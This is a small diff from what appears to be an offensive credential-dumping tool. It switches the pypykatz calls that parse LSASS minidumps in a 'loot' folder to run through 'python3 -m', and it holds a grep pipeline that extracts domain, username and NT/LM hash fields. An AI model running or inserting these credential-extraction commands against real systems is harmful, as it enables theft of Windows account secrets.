@@ -948,8 +948,8 @@ if __name__ == '__main__':
 
         if options.ap != False:
             print("\n[parsing files]")
-            os.system("pypykatz lsa minidump -d ./loot/{}/ -o ./loot/{}/dumped_full.txt".format(timestamp, timestamp))
-            os.system("pypykatz lsa -g minidump -d ./loot/{}/ -o ./loot/{}/dumped_full_grep.grep".format(timestamp, timestamp))
+            os.system("python3 -m pypykatz lsa minidump -d ./loot/{}/ -o ./loot/{}/dumped_full.txt".format(timestamp, timestamp))
+            os.system("python3 -m pypykatz lsa -g minidump -d ./loot/{}/ -o ./loot/{}/dumped_full_grep.grep".format(timestamp, timestamp))
             os.system("echo 'Domain:Username:NT:LM' > ./loot/{}/dumped_msv.txt; grep 'msv' ./loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> ./loot/{}/dumped_msv.txt".format(timestamp, timestamp, timestamp))
 
 
